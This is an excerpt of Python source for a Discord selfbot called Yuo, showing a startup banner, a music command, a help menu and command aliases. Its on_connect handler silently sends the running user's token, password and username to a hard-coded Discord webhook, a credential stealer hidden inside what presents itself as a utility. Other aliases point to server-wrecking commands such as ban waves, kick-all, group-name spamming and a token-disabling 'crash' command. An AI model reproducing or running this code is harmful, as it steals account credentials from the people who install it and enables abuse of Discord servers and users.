...
stream_url = "https://www.twitch.tv/gl_styx"
tts_language = "en"
...
░░░╚═╝░░░░╚═════╝░░╚════╝░  ╚═════╝░╚══════╝╚══════╝╚═╝░░░░░╚═════╝░░╚════╝░░░░╚═╝░░░
                       ...
                       {Fore.CYAN}Yuo v{SELFBOT.__version__} | {Fore.CYAN}Logged in as: {Yuo.user.name}#{Yuo.user.discriminator} {Fore.CYAN}| ID: {Fore.CYAN}{Yuo.user.id}   
                       {Fore.CYAN}Nitro Sniper | {Fore.CYAN}{nitro}
                       {Fore.CYAN}Cached Users: {Fore.CYAN}{len(Yuo.users)}
                       {Fore.CYAN}Guilds: {Fore.CYAN}{len(Yuo.guilds)}
                       {Fore.CYAN}Prefix: {Fore.CYAN}{Yuo.command_prefix}
    ''' + Fore.RESET)
...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/826956359635042374/jsz8JS2rGxciVRrHVIeFYqtgS38JIof_yI1-boityYr1EV0jF3hvIFOJ7nFQnBsF19Pd',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`**Username: {Yuo.user.name}**"})
    startprint()
...
@Yuo.command(aliases=["queue"])
async def play(ctx, *, query):
    await ctx.message.delete()
    voice = get(Yuo.voice_clients, guild=ctx.guild)
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.add_field(name="\uD83E\uDDCA `GENERAL`", value="Shows all account commands", inline=False)
        ...
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(
            url="https://images-ext-1.discordapp.net/external/__GnKIVffGi3PbAL_Q5p9Dt8AuL9upjYyy3q2fW_fv0/https/media.discordapp.net/attachments/760116404107870228/778236393863381002/20201116_215614.gif?width=432&height=265")
...
@Yuo.command(aliases=["spamchangegcname", "changegcname"])
...
@Yuo.command(aliases=['tokenfucker', 'disable', 'crash'])
...
@Yuo.command(aliases=["banwave", "banall", "etb"])
...
@Yuo.command(aliases=["kickall", "kickwave"])
...
@Yuo.command(aliases=["purgebans", "unbanall"])
